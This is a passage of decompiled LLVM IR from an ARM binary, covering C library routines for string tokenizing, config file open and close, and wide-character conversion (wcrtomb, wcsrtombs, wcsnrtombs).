  %v2_183bc17 = icmp eq i8 %v2_183b815, 0
  store i1 %v2_183bc17, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_183bc17, label %dec_label_pc_183d4, label %dec_label_pc_183c4.preheader

dec_label_pc_183c4.preheader:                     ; preds = %dec_label_pc_183b8.preheader
  %v2_183c482 = load i8, i8* %v1_182ec, align 1
  %v3_183c483 = zext i8 %v2_183c482 to i32
  store i32 %v3_183c483, i32* %r3.global-to-local, align 4
  %v9_183c886 = icmp eq i8 %v2_183c482, %v2_183b815
  store i1 %v9_183c886, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_183c886, label %dec_label_pc_183d4, label %bb74

dec_label_pc_18300:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_18304 = load i32, i32* %v2_182b4, align 4
  store i32 %v2_18304, i32* %r3.global-to-local, align 4
  store i32 %v1_18114, i32* %r2.global-to-local, align 4
  %v9_1830c = icmp eq i32 %v2_1831088, %v1_18114
  store i1 %v9_1830c, i1* %cpsr_z.global-to-local, align 1
  %v5_18310 = mul i32 %v2_1831088, 4
  %v6_18310 = add i32 %v2_18304, %v5_18310
  %v7_18310 = inttoptr i32 %v6_18310 to i32*
  store i32 %v0_1831087, i32* %v7_18310, align 4
  br i1 %v9_1830c, label %dec_label_pc_18318, label %dec_label_pc_18324

dec_label_pc_18318:                               ; preds = %dec_label_pc_18300
  store i32 %v1_18120, i32* %r3.global-to-local, align 4
  store i1 %v2_1831c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1831c, label %dec_label_pc_18324, label %dec_label_pc_18344

dec_label_pc_18324:                               ; preds = %dec_label_pc_18318, %dec_label_pc_18300
  %v0_18324 = load i32, i32* @r7, align 4
  %v1_18324 = inttoptr i32 %v0_18324 to i8*
  %v2_18324 = load i8, i8* %v1_18324, align 1
  %v3_18324 = zext i8 %v2_18324 to i32
  store i32 %v3_18324, i32* %r3.global-to-local, align 4
  %v2_18328 = icmp eq i8 %v2_18324, 0
  store i1 %v2_18328, i1* %cpsr_z.global-to-local, align 1
  %v0_1832c = load i32, i32* @r4, align 4
  store i32 %v0_1832c, i32* @r0, align 4
  %v1_18330 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_18328, i32 %v1_18330, i32 %v0_18324
  store i32 %storemerge, i32* @r1, align 4
  %v0_18338 = call i32 @strcspn()
  store i32 %v0_18338, i32* %r0.global-to-local, align 4
  %v0_1833c = load i32, i32* @r4, align 4
  %v2_1833c = add i32 %v0_1833c, %v0_18338
  store i32 %v2_1833c, i32* @r4, align 4
  br label %dec_label_pc_1837c

dec_label_pc_18344:                               ; preds = %dec_label_pc_18318
  %v0_18344 = load i32, i32* @r4, align 4
  store i32 %v0_18344, i32* @r0, align 4
  %v0_18348 = load i32, i32* @r7, align 4
  %v1_18348 = inttoptr i32 %v0_18348 to i8*
  %v2_18348 = load i8, i8* %v1_18348, align 1
  %v3_18348 = zext i8 %v2_18348 to i32
  %v5_1834c = call i32 @__GI_strchrnul(i32 %v0_18344, i32 %v3_18348, i32 %v1_18114, i32 %v1_18120)
  store i32 %v5_1834c, i32* %r0.global-to-local, align 4
  store i32 %v1_18110, i32* %r2.global-to-local, align 4
  store i1 %v2_182c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_1834c, i32* @r4, align 4
  br i1 %v2_182c4, label %dec_label_pc_1837c, label %dec_label_pc_18368

dec_label_pc_18364:                               ; preds = %dec_label_pc_18368
  %v1_18364 = add i32 %v0_1837c.pre, -1
  store i32 %v1_18364, i32* @r4, align 4
  br label %dec_label_pc_18368

dec_label_pc_18368:                               ; preds = %dec_label_pc_18344, %dec_label_pc_18364
  %v0_18368 = phi i32 [ %v1_18364, %dec_label_pc_18364 ], [ %v5_1834c, %dec_label_pc_18344 ]
  %v1_18368 = add i32 %v0_18368, -1
  %v2_18368 = inttoptr i32 %v1_18368 to i8*
  %v3_18368 = load i8, i8* %v2_18368, align 1
  %v4_18368 = zext i8 %v3_18368 to i32
  %v0_1836c = load i32, i32* @sl, align 4
  store i32 %v0_1836c, i32* @r0, align 4
  %v2_18370 = call i32 @__GI_strchr(i32 %v0_1836c, i32 %v4_18368)
  store i32 %v2_18370, i32* %r0.global-to-local, align 4
  %v2_18374 = icmp eq i32 %v2_18370, 0
  store i1 %v2_18374, i1* %cpsr_z.global-to-local, align 1
  %v0_1837c.pre = load i32, i32* @r4, align 4
  br i1 %v2_18374, label %dec_label_pc_1837c, label %dec_label_pc_18364

dec_label_pc_1837c:                               ; preds = %dec_label_pc_18368, %dec_label_pc_18344, %dec_label_pc_18324
  %v3_18388 = phi i32 [ %v5_1834c, %dec_label_pc_18344 ], [ %v2_1833c, %dec_label_pc_18324 ], [ %v0_1837c.pre, %dec_label_pc_18368 ]
  %v1_1837c = inttoptr i32 %v3_18388 to i8*
  %v2_1837c = load i8, i8* %v1_1837c, align 1
  %v3_1837c = zext i8 %v2_1837c to i32
  store i32 %v3_1837c, i32* %r2.global-to-local, align 4
  %v0_18380 = load i32, i32* @r7, align 4
  %v1_18380 = inttoptr i32 %v0_18380 to i8*
  %v2_18380 = load i8, i8* %v1_18380, align 1
  %v3_18380 = zext i8 %v2_18380 to i32
  store i32 %v3_18380, i32* %r3.global-to-local, align 4
  %v9_18384 = icmp eq i8 %v2_18380, %v2_1837c
  store i1 %v9_18384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18384, label %bb71, label %dec_label_pc_18390

bb71:                                             ; preds = %dec_label_pc_1837c
  %v1_18388 = load i32, i32* @fp, align 4
  %v2_18388 = trunc i32 %v1_18388 to i8
  store i8 %v2_18388, i8* %v1_1837c, align 1
  %v0_1838c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1838c.pr, label %bb73, label %.dec_label_pc_18390_crit_edge

.dec_label_pc_18390_crit_edge:                    ; preds = %bb71
  %v0_18390.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18390

dec_label_pc_18390:                               ; preds = %.dec_label_pc_18390_crit_edge, %dec_label_pc_1837c
  %v0_18390 = phi i32 [ %v0_18390.pre, %.dec_label_pc_18390_crit_edge ], [ %v3_1837c, %dec_label_pc_1837c ]
  %v2_18390 = icmp eq i32 %v0_18390, 0
  store i1 %v2_18390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18390, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_18390
  %v1_18394 = load i32, i32* @fp, align 4
  %v2_18394 = trunc i32 %v1_18394 to i8
  %v3_18394 = load i32, i32* @r4, align 4
  %v4_18394 = inttoptr i32 %v3_18394 to i8*
  store i8 %v2_18394, i8* %v4_18394, align 1
  %v5_18394 = load i32, i32* @r4, align 4
  %v6_18394 = add i32 %v5_18394, 1
  store i32 %v6_18394, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_18390, %bb72
  %v2_18398 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_18398, i32* %r3.global-to-local, align 4
  %v2_1839c = icmp eq i32 %v2_18398, 0
  store i1 %v2_1839c, i1* %cpsr_z.global-to-local, align 1
  %v0_183b8.pre = load i32, i32* @r4, align 4
  br i1 %v2_1839c, label %dec_label_pc_183b4, label %dec_label_pc_183a4

dec_label_pc_183a4:                               ; preds = %bb73
  store i32 %v0_183b8.pre, i32* @r0, align 4
  %v1_183ac = inttoptr i32 %v0_183b8.pre to i8*
  %v2_183ac = call i32 @__GI_strspn(i8* %v1_183ac)
  store i32 %v2_183ac, i32* %r0.global-to-local, align 4
  %v0_183b0 = load i32, i32* @r4, align 4
  %v2_183b0 = add i32 %v0_183b0, %v2_183ac
  store i32 %v2_183b0, i32* @r4, align 4
  br label %dec_label_pc_183b4

dec_label_pc_183b4:                               ; preds = %bb73, %dec_label_pc_183a4
  %v0_183b8 = phi i32 [ %v2_183b0, %dec_label_pc_183a4 ], [ %v0_183b8.pre, %bb73 ]
  %v0_183b4 = load i32, i32* @r6, align 4
  %v1_183b4 = add i32 %v0_183b4, 1
  store i32 %v1_183b4, i32* @r6, align 4
  %v1_183b8 = inttoptr i32 %v0_183b8 to i8*
  %v2_183b8 = load i8, i8* %v1_183b8, align 1
  %v3_183b8 = zext i8 %v2_183b8 to i32
  store i32 %v3_183b8, i32* %r2.global-to-local, align 4
  %v2_183bc = icmp eq i8 %v2_183b8, 0
  store i1 %v2_183bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_183bc, label %dec_label_pc_183d4, label %dec_label_pc_183b4.dec_label_pc_183c4_crit_edge

dec_label_pc_183b4.dec_label_pc_183c4_crit_edge:  ; preds = %dec_label_pc_183b4
  %v0_183c4.pre = load i32, i32* @r7, align 4
  %v1_183c4 = inttoptr i32 %v0_183c4.pre to i8*
  %v2_183c4 = load i8, i8* %v1_183c4, align 1
  %v3_183c4 = zext i8 %v2_183c4 to i32
  store i32 %v3_183c4, i32* %r3.global-to-local, align 4
  %v9_183c8 = icmp eq i8 %v2_183c4, %v2_183b8
  store i1 %v9_183c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_183c8, label %dec_label_pc_183d4, label %bb74

bb74:                                             ; preds = %dec_label_pc_183c4.preheader, %dec_label_pc_183b4.dec_label_pc_183c4_crit_edge
  %v2_1831088 = phi i32 [ %v1_183b4, %dec_label_pc_183b4.dec_label_pc_183c4_crit_edge ], [ %v1_182f4, %dec_label_pc_183c4.preheader ]
  %v0_1831087 = phi i32 [ %v0_183b8, %dec_label_pc_183b4.dec_label_pc_183c4_crit_edge ], [ %v0_183b813, %dec_label_pc_183c4.preheader ]
  %v2_183cc = load i32, i32* @sb, align 4
  %v3_183cc = sub i32 %v2_1831088, %v2_183cc
  %v5_183cc = xor i32 %v2_183cc, %v2_1831088
  %v6_183cc = xor i32 %v3_183cc, %v2_1831088
  %v7_183cc = and i32 %v6_183cc, %v5_183cc
  %v8_183cc = icmp slt i32 %v7_183cc, 0
  %v9_183cc = icmp slt i32 %v3_183cc, 0
  %v10_183cc = icmp eq i32 %v2_1831088, %v2_183cc
  store i1 %v10_183cc, i1* %cpsr_z.global-to-local, align 1
  %v2_183d0 = xor i1 %v9_183cc, %v8_183cc
  br i1 %v2_183d0, label %dec_label_pc_18300, label %dec_label_pc_183d4

dec_label_pc_183d4:                               ; preds = %dec_label_pc_183c4.preheader, %bb74, %dec_label_pc_183b4, %dec_label_pc_183b4.dec_label_pc_183c4_crit_edge, %dec_label_pc_183b8.preheader
  %v0_183d8 = phi i32 [ %v1_182f4, %dec_label_pc_183b8.preheader ], [ %v1_182f4, %dec_label_pc_183c4.preheader ], [ %v2_1831088, %bb74 ], [ %v1_183b4, %dec_label_pc_183b4 ], [ %v1_183b4, %dec_label_pc_183b4.dec_label_pc_183c4_crit_edge ]
  store i32 %v3_180f8, i32* %r2.global-to-local, align 4
  %v9_183d8 = icmp eq i32 %v0_183d8, %v3_180f8
  store i1 %v9_183d8, i1* %cpsr_z.global-to-local, align 1
  %v6_183dc = icmp slt i32 %v0_183d8, %v3_180f8
  br i1 %v6_183dc, label %dec_label_pc_183e0, label %dec_label_pc_183ec

dec_label_pc_183e0:                               ; preds = %dec_label_pc_183d4
  %v0_183e0 = load i32, i32* @r8, align 4
  %v1_183e0 = and i32 %v0_183e0, 1048576
  %v2_183e0 = icmp eq i32 %v1_183e0, 0
  store i1 %v2_183e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_183e0, label %dec_label_pc_18138.backedge, label %dec_label_pc_183e8

dec_label_pc_183e8:                               ; preds = %dec_label_pc_183e0, %dec_label_pc_182a0, %.thread, %entry
  br label %dec_label_pc_183ec

dec_label_pc_183ec:                               ; preds = %dec_label_pc_183d4, %dec_label_pc_181bc, %dec_label_pc_183e8
  %v0_183ec = phi i32 [ %v0_181cc, %dec_label_pc_181bc ], [ 0, %dec_label_pc_183e8 ], [ %v0_183d8, %dec_label_pc_183d4 ]
  store i32 %v0_183ec, i32* %r0.global-to-local, align 4
  store i32 %v3_180d4, i32* @r4, align 4
  store i32 %v6_180d4, i32* @r5, align 4
  store i32 %v9_180d4, i32* @r6, align 4
  store i32 %v12_180d4, i32* @r7, align 4
  store i32 %v15_180d4, i32* @r8, align 4
  store i32 %v18_180d4, i32* @sb, align 4
  store i32 %v21_180d4, i32* @sl, align 4
  store i32 %v24_180d4, i32* @fp, align 4
  ret i32 %v0_183ec

; uselistorder directives
  uselistorder i32 %v0_183ec, { 1, 0 }
  uselistorder i32 %v0_183d8, { 0, 2, 1 }
  uselistorder i32 %v3_183cc, { 1, 0 }
  uselistorder i32 %v2_183cc, { 1, 0, 2 }
  uselistorder i32 %v2_1831088, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_183c8, { 1, 0 }
  uselistorder i32 %v0_183b8.pre, { 0, 2, 1 }
  uselistorder i32 %v5_1834c, { 1, 0, 2, 3 }
  uselistorder i1 %v9_183c886, { 1, 0 }
  uselistorder i1 %v9_182f0, { 1, 0 }
  uselistorder i32 %v3_182c8, { 0, 2, 1, 3 }
  uselistorder i1 %v7_182a0, { 1, 0 }
  uselistorder i1 %v8_18298, { 1, 0 }
  uselistorder i32 %v3_18268, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_18258, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_18240, { 1, 0, 2 }
  uselistorder i32 %v1_18230, { 1, 0, 2 }
  uselistorder i32 %v0_1821c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18214, { 1, 0 }
  uselistorder i32 %v1_18200, { 1, 0 }
  uselistorder i32 %v1_181fc, { 1, 0 }
  uselistorder i32 %v2_181d8, { 1, 0 }
  uselistorder i32 %v1_181bc, { 2, 0, 1 }
  uselistorder i32 %v0_181a4, { 1, 0 }
  uselistorder i32 %v1_18194, { 0, 2, 1 }
  uselistorder i1 %v2_182c4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_18120, { 2, 0, 1, 3 }
  uselistorder i32 %v1_18114, { 2, 1, 0 }
  uselistorder i32 %v3_180fc, { 1, 0 }
  uselistorder i32 %v3_180f8, { 2, 1, 0 }
  uselistorder i32 %v1_180f0, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 25, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 33, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_183ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_183d4, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_183b4, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18368, { 1, 0 }
  uselistorder label %dec_label_pc_18138.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_182e0, { 1, 0 }
  uselistorder label %dec_label_pc_182a0, { 1, 0 }
  uselistorder label %dec_label_pc_18294, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18258, { 1, 0 }
  uselistorder label %dec_label_pc_1818c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_18400 = icmp eq i32* %arg1, null
  br i1 %v2_18400, label %dec_label_pc_18428, label %dec_label_pc_18408

dec_label_pc_18408:                               ; preds = %entry
  %v2_18408 = load i32, i32* %arg1, align 4
  %v1_1840c = inttoptr i32 %v2_18408 to i16*
  %v2_1840c = call i32 @__GI_fclose(i16* %v1_1840c)
  %v0_18410 = load i32, i32* @r4, align 4
  %v1_18410 = add i32 %v0_18410, 20
  %v2_18410 = inttoptr i32 %v1_18410 to i32*
  %v3_18410 = load i32, i32* %v2_18410, align 4
  %v2_18414 = icmp eq i32 %v3_18410, 0
  br i1 %v2_18414, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_18408
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_18408, %bb
  store i32 99360, i32* @lr, align 4
  %v1_1841c = xor i1 %v2_18414, true
  call void @__pseudo_cond_branch(i1 %v1_1841c, i32 ptrtoint (i32* @global_var_15e54.996 to i32))
  %v0_18420 = load i32, i32* @r4, align 4
  store i32 %v0_18420, i32* @r0, align 4
  %v0_18424 = call i32 @free()
  br label %dec_label_pc_18428

dec_label_pc_18428:                               ; preds = %entry, %bb6
  %v1_1842c = phi i32 [ 0, %entry ], [ %v0_18424, %bb6 ]
  ret i32 %v1_1842c

; uselistorder directives
  uselistorder label %dec_label_pc_18428, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1843c = load i32, i32* @r4, align 4
  store i32 %v3_1843c, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2276), i32* @r1, align 4
  %v0_18444 = load i32, i32* @r0, align 4
  %v2_18444 = call i32 @__GI_fopen(i32 %v0_18444, i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2276))
  store i32 %v2_18444, i32* %r0.global-to-local, align 4
  store i32 %v2_18444, i32* @r4, align 4
  %v2_18448 = icmp eq i32 %v2_18444, 0
  br i1 %v2_18448, label %bb, label %dec_label_pc_18454

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_18454:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1845c = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_1845c, i32* %r0.global-to-local, align 4
  %v2_18460 = icmp eq i32 %v2_1845c, 0
  br i1 %v2_18460, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_18454
  %v1_18464 = load i32, i32* @r4, align 4
  %v3_18464 = inttoptr i32 %v2_1845c to i32*
  store i32 %v1_18464, i32* %v3_18464, align 4
  %v1_1846c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_18454, %bb4
  %v1_1846c = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_18454 ], [ %v1_1846c.pre, %bb4 ]
  %v2_18468 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18468, i32* @r4, align 4
  ret i32 %v1_1846c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2276), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_18478 = load i32, i32* @lr, align 4
  %v2_1847c = icmp eq i32 %arg1, 0
  br i1 %v2_1847c, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_18484 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_184ac = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_18498 = phi i32 [ %arg1, %.thread ], [ %v3_18484, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_18494 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_18494, i32* @ip, align 4
  %v2_1849c = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_18494, i32* %stack_var_-16, align 4
  store i32 %v0_184ac, i32* %stack_var_-12, align 4
  %v5_184b4 = inttoptr i32 %v0_18498 to i8*
  %v6_184b4 = call i32 @__GI_wcsnrtombs(i8* %v5_184b4, i32 %v2_1849c, i32 1, i32 16, i32 %arg3)
  %v2_184b8 = icmp eq i32 %v6_184b4, 0
  br i1 %v2_184b8, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_184c8 = phi i32 [ %v6_184b4, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_18478, i32* @lr, align 4
  ret i32 %v1_184c8

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_184e0 = load i32, i32* @r0, align 4
  %v1_184e0 = load i32, i32* @r1, align 4
  %v5_184e0 = inttoptr i32 %v0_184e0 to i8*
  %v6_184e0 = call i32 @__GI_wcsnrtombs(i8* %v5_184e0, i32 %v1_184e0, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_184e0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_184f0 = load i32, i32* @r4, align 4
  store i32 %v3_184f0, i32* %stack_var_-12, align 4
  %v10_184f4 = icmp eq i32 %tmp, %arg2
  store i1 %v10_184f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_184f4, label %dec_label_pc_1850c, label %bb

bb:                                               ; preds = %entry
  %v4_184f8 = icmp eq i8* %arg1, null
  store i1 %v4_184f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_184f8, label %dec_label_pc_1850c.thread, label %bb39

dec_label_pc_1850c.thread:                        ; preds = %bb
  %v2_184fc = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_1850c:                               ; preds = %entry
  %v2_184fc1 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_1850c = icmp eq i8* %arg1, null
  store i1 %v3_1850c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1850c, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1850c
  store i32 %v2_184fc1, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_1850c, %dec_label_pc_1850c.thread
  %storemerge20 = phi i32 [ %v2_184fc1, %dec_label_pc_1850c ], [ %v2_184fc, %dec_label_pc_1850c.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_1856828 = phi i32 [ %v2_184fc1, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_18524 = load i32, i32* @r3, align 4
  %v3_18524 = icmp uge i32 %v0_18524, %arg3
  %arg3.v0_18524 = select i1 %v3_18524, i32 %arg3, i32 %v0_18524
  store i32 %arg3.v0_18524, i32* %r5.global-to-local, align 4
  %v1_18530 = inttoptr i32 %arg2 to i32*
  %v2_18530 = load i32, i32* %v1_18530, align 4
  store i32 %v2_18530, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_18524, i32* %r0.global-to-local, align 4
  %v2_1857c22 = icmp eq i32 %arg3.v0_18524, 0
  store i1 %v2_1857c22, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1857c22, label %dec_label_pc_18584, label %dec_label_pc_1853c

dec_label_pc_1853c:                               ; preds = %.thread14.thread, %dec_label_pc_18574.dec_label_pc_1853c_crit_edge
  %v2_18568 = phi i32 [ %v2_18574, %dec_label_pc_18574.dec_label_pc_1853c_crit_edge ], [ %v2_1856828, %.thread14.thread ]
  %v0_18548 = phi i32 [ %v0_1853c.pre, %dec_label_pc_18574.dec_label_pc_1853c_crit_edge ], [ %v2_18530, %.thread14.thread ]
  %v1_1853c = inttoptr i32 %v0_18548 to i32*
  %v2_1853c = load i32, i32* %v1_1853c, align 4
  %v7_18540 = icmp eq i32 %v2_1853c, 127
  store i1 %v7_18540, i1* %cpsr_z.global-to-local, align 1
  %v1_18544 = urem i32 %v2_1853c, 256
  store i32 %v1_18544, i32* @ip, align 4
  %v1_18548 = add i32 %v0_18548, 4
  store i32 %v1_18548, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_1853c, 128
  br i1 %tmp45, label %dec_label_pc_18564, label %dec_label_pc_18550

dec_label_pc_18550:                               ; preds = %dec_label_pc_1853c
  %v0_18550 = call i32 @__GI___errno_location()
  store i32 %v0_18550, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1855c = inttoptr i32 %v0_18550 to i32*
  store i32 84, i32* %v2_1855c, align 4
  %v0_18590.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18590

dec_label_pc_18564:                               ; preds = %dec_label_pc_1853c
  %v2_18564 = icmp eq i32 %v1_18544, 0
  store i1 %v2_18564, i1* %cpsr_z.global-to-local, align 1
  %v1_18568 = trunc i32 %v2_1853c to i8
  %v3_18568 = inttoptr i32 %v2_18568 to i8*
  store i8 %v1_18568, i8* %v3_18568, align 1
  %v0_1856c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1856c, label %.dec_label_pc_18584_crit_edge, label %dec_label_pc_18574

dec_label_pc_18574:                               ; preds = %dec_label_pc_18564
  %v0_18574 = load i32, i32* %lr.global-to-local, align 4
  %v1_18574 = load i32, i32* %r4.global-to-local, align 4
  %v2_18574 = add i32 %v1_18574, %v0_18574
  store i32 %v2_18574, i32* %lr.global-to-local, align 4
  %v0_18578 = load i32, i32* %r0.global-to-local, align 4
  %v1_18578 = add i32 %v0_18578, -1
  store i32 %v1_18578, i32* %r0.global-to-local, align 4
  %v2_1857c = icmp eq i32 %v1_18578, 0
  store i1 %v2_1857c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1857c, label %dec_label_pc_18584, label %dec_label_pc_18574.dec_label_pc_1853c_crit_edge

dec_label_pc_18574.dec_label_pc_1853c_crit_edge:  ; preds = %dec_label_pc_18574
  %v0_1853c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1853c

.dec_label_pc_18584_crit_edge:                    ; preds = %dec_label_pc_18564
  %v1_1856c = load i32, i32* @ip, align 4
  store i32 %v1_1856c, i32* %r2.global-to-local, align 4
  %v0_18584.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_18584

dec_label_pc_18584:                               ; preds = %dec_label_pc_18574, %.dec_label_pc_18584_crit_edge, %.thread14.thread
  %v0_18584 = phi i32 [ %v0_18584.pre, %.dec_label_pc_18584_crit_edge ], [ %v2_1856828, %.thread14.thread ], [ %v2_18574, %dec_label_pc_18574 ]
  %v1_18584 = load i32, i32* @sp, align 4
  %v9_18584 = icmp eq i32 %v0_18584, %v1_18584
  store i1 %v9_18584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18584, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_18584
  %v1_18588 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_18588, i32* %v1_18530, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_18584, %bb43
  %v0_1858c = load i32, i32* %r0.global-to-local, align 4
  %v1_1858c = load i32, i32* %r5.global-to-local, align 4
  %v2_1858c = sub i32 %v1_1858c, %v0_1858c
  store i32 %v2_1858c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18590

dec_label_pc_18590:                               ; preds = %dec_label_pc_18550, %bb44
  %v0_18590 = phi i32 [ %v0_18590.pre, %dec_label_pc_18550 ], [ %v2_1858c, %bb44 ]
  store i32 %v0_18590, i32* %r0.global-to-local, align 4
  %v2_18598 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18598, i32* %r4.global-to-local, align 4
  ret i32 %v0_18590

; uselistorder directives
  uselistorder i32 %v0_18590, { 1, 0 }
